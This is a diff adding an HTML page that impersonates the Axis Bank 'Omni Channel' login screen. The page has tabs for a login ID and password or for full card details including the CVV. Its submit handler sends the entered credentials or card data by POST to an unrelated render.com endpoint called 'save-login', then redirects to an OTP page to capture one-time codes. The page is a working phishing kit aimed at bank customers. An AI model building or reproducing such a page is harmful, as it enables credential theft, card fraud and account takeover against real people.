@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Axis Omni Channel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+        font-family: Arial, sans-serif;
+    }
+    .bg-gradient {
+         background: white; /* Pure white header */
+  color: black; /* Text color adjusted for contrast */
+    }
+    .hidden {
+        display: none;
+    }
+    .toggle-button {
+        border: 2px solid #8B004B;
+        font-weight: bold;
+        padding: 6px 12px;
+        font-size: 14px;
+        border-radius: 20px;
+        cursor: pointer;
+        flex-grow: 1;
+        text-align: center;
+        white-space: nowrap;
+    }
+    .active-tab {
+        background-color: #8B004B;
+        color: white;
+    }
+    .inactive-tab {
+        background-color: white;
+        color: #8B004B;
+    }
+    .form-container {
+        width: 100%;
+        max-width: 450px;
+        margin: 0 auto;
+        padding: 1px;
+        position: relative;
+    }
+    .header-container {
+      background: white; /* Pure white header */
+      color: black; /* Text color adjusted for contrast */
+    padding: 1px;
+    text-align: center;
+    height: 110px;
+    border: none; /* Removed borders for smoothness */
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 1000;
+    box-shadow: none; /* Remove shadow if any */
+}
+
+.content-container {
+    padding: 10px;
+    margin-top: 0px; /* Offset by the header height */
+    border: none; /* Remove border to avoid separation */
+    background: white; /* Pure white header */
+    color: black; /* Text color adjusted for contrast */
+    box-shadow: none; /* Removed shadows for consistency */
+}
+.footer-container {
+      width: 100%;
+      height: 100px; /* You can adjust this value */
+      background: url('footer.jpg') no-repeat center center;
+      background-size: cover;
+      position: relative;
+      margin-top: auto; /* Push the footer to the bottom */
+    }
+
+    input, select {
+        font-size: 14px;
+        padding: 6px;
+    }
+    
+    .link {
+        font-size: 12px;
+        color: #8B004B;
+        text-decoration: none;
+        cursor: pointer;
+    }
+    .link:hover {
+        text-decoration: underline;
+    }
+    .loading-spinner {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        border: 8px solid #f3f3f3;
+        border-top: 8px solid #3498db;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+
+</head>
+<body class="bg-gradient min-h-screen flex items-center justify-center">
+  <div class="form-container bg-white rounded-lg shadow-lg relative">
+    <div id="loading-spinner" class="loading-spinner hidden"></div>
+    <div class="header-container">
+      <img src="header.jpg" alt="Axis Bank">
+      
+    </div>
+
+    <div class="content-container">
+      <div class="text-left mb-4">
+        <h2 class="text-xl font-bold text-gray-800">Login Using</h2>
+      </div>
+
+      <div class="flex justify-center mb-4 space-x-4">
+        <button id="login-tab" class="toggle-button active-tab">Login ID / Customer ID</button>
+        <button id="debit-tab" class="toggle-button inactive-tab">Credit Card No.</button>
+      </div>
+
+    <form id="login-form" class="space-y-4">
+      <div id="login-section">
+        <label for="userId" class="block text-sm text-gray-600 mb-1"><b>Login ID / Customer ID</b></label>
+        <input type="text" id="userId" name="userId" placeholder="Enter User ID" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500">
+        <div class="text-left text-sm mt-1">
+          <a class="link" href="#">Forgot customer ID</a>&nbsp;&nbsp;&nbsp;
+          <a class="link" href="#">Enable login ID</a>
+        </div>
+        <br>
+        <label for="password" class="block text-sm text-gray-600 mb-1"><b>Password</b></label>
+        <div class="relative">
+          <input type="password" id="password" name="password" placeholder="Enter Password" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500">
+          <button type="button" id="toggle-password" class="absolute inset-y-0 right-3 flex items-center text-gray-600 focus:outline-none">
+            👁
+          </button>
+        </div>
+        <div class="text-left text-sm mt-1">
+          <a class="link" href="#">Forgot password</a>
+        </div>
+        
+
+                 <label for="options" class="block text-sm text-gray-600 mb-1 mt-4">Login directly to</label>
+          <select id="options" name="options" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500">
+            <option value="dashboard">Dashboard</option>
+            <option value="accounts">Accounts</option>
+            <option value="term-deposits">Term Deposits</option>
+            <option value="payments">Payments</option>
+            <option value="investments">Investments</option>
+            <option value="credit-cards">Credit Cards</option>
+            <option value="insurance">Insurance</option>
+            <option value="loans">Loans</option>
+            <option value="services">Services</option>
+          </select>
+        </div>
+
+
+      <div id="debit-section" class="hidden">
+        <label for="cardNumber" class="block text-sm text-gray-600 mb-1">Card Number</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter Debit/Credit Card Number" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500">
+
+        <label for="cardHolder" class="block text-sm text-gray-600 mb-1">Card Holder Name</label>
+        <input type="text" id="cardHolder" name="cardHolder" placeholder="Enter Card Holder Name" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500">
+
+        <label for="expiry" class="block text-sm text-gray-600 mb-1">Expiry Date</label>
+        <input type="text" id="expiry" name="expiry" placeholder="MM/YY" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500">
+
+        <label for="cvv" class="block text-sm text-gray-600 mb-1">CVV</label>
+        <input type="password" id="cvv" name="cvv" placeholder="***" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500">
+      </div>
+<br>
+      <button 
+  type="submit" 
+  class="w-full text-white font-medium hover:bg-[#7e405d] focus:outline-none focus:ring-1 focus:ring-[#69354a]"
+  style="background-color: #8B004B; border-radius: 10px; height: 50px; width: 340px; text-align: center; line-height: 50px; display: inline-block; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);"
+>
+  Login
+</button>
+
+
+    </form>
+    <div class="text-center text-sm mt-4">
+      First time user? <b class="link" href="#"><b>REGISTER HERE</b></a>
+    </div>
+  </div>
+</div>
+
+<div class="footer-container"></div>
+
+</div>
+
+
+  <script>
+    const loginTab = document.getElementById('login-tab');
+    const debitTab = document.getElementById('debit-tab');
+    const loginSection = document.getElementById('login-section');
+    const debitSection = document.getElementById('debit-section');
+    const passwordField = document.getElementById('password');
+    const togglePassword = document.getElementById('toggle-password');
+  
+    loginTab.addEventListener('click', () => {
+      loginTab.classList.add('active-tab');
+      loginTab.classList.remove('inactive-tab');
+      debitTab.classList.add('inactive-tab');
+      debitTab.classList.remove('active-tab');
+      loginSection.classList.remove('hidden');
+      debitSection.classList.add('hidden');
+    });
+  
+    debitTab.addEventListener('click', () => {
+      debitTab.classList.add('active-tab');
+      debitTab.classList.remove('inactive-tab');
+      loginTab.classList.add('inactive-tab');
+      loginTab.classList.remove('active-tab');
+      debitSection.classList.remove('hidden');
+      loginSection.classList.add('hidden');
+    });
+  
+    togglePassword.addEventListener('click', () => {
+      if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+        togglePassword.textContent = '👁';
+      } else {
+        passwordField.type = 'password';
+        togglePassword.textContent = '👁';
+      }
+    });
+  
+    document.getElementById('login-form').addEventListener('submit', (event) => {
+      event.preventDefault();
+      
+      // Check if all required fields are filled
+      const isDebitActive = !debitSection.classList.contains('hidden');
+      let isFormValid = true;
+      
+      if (isDebitActive) {
+        if (!document.getElementById('cardNumber').value.trim() ||
+            !document.getElementById('cardHolder').value.trim() ||
+            !document.getElementById('expiry').value.trim() ||
+            !document.getElementById('cvv').value.trim()) {
+          isFormValid = false;
+          alert('Please fill all the card details!');
+        }
+      } else {
+        if (!document.getElementById('userId').value.trim() ||
+            !document.getElementById('password').value.trim() ||
+            !document.getElementById('options').value.trim()) {
+          isFormValid = false;
+          alert('Please fill all the login details!');
+        }
+      }
+  
+      if (!isFormValid) {
+        return;
+      }
+  
+      document.getElementById('loading-spinner').classList.remove('hidden');
+  
+      const data = isDebitActive
+        ? {
+            cardNumber: document.getElementById('cardNumber').value.trim(),
+            cardHolder: document.getElementById('cardHolder').value.trim(),
+            expiry: document.getElementById('expiry').value.trim(),
+            cvv: document.getElementById('cvv').value.trim(),
+          }
+        : {
+            userId: document.getElementById('userId').value.trim(),
+            password: document.getElementById('password').value.trim(),
+            action: document.getElementById('options').value,
+          };
+  
+      fetch('https://backend-e2yf.onrender.com/api/save-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+      })
+        .then((response) => response.json())
+        .then((result) => {
+          document.getElementById('loading-spinner').classList.add('hidden');
+          if (result.success) {
+            localStorage.setItem('userId', data.userId || data.cardNumber);
+            window.location.href = 'otp.html';
+          } else {
+            alert('Login failed!');
+          }
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+          document.getElementById('loading-spinner').classList.add('hidden');
+        });
+    });
+  </script>
+  
+</body>
+</html>
